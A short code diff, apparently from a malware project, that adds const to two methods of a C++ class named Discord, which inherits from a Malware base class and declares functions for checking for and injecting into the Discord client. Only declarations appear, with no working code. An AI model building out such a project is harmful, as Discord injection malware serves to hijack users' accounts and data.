@@ -20,8 +20,8 @@ class Discord : public Malware
     public:
         bool checkDiscord();
         bool injectDiscord();
-        bool isInjectionWrited();
-        bool isDiscordInstalled();
+        bool isInjectionWrited() const;
+        bool isDiscordInstalled() const;
 };
 
 #endif
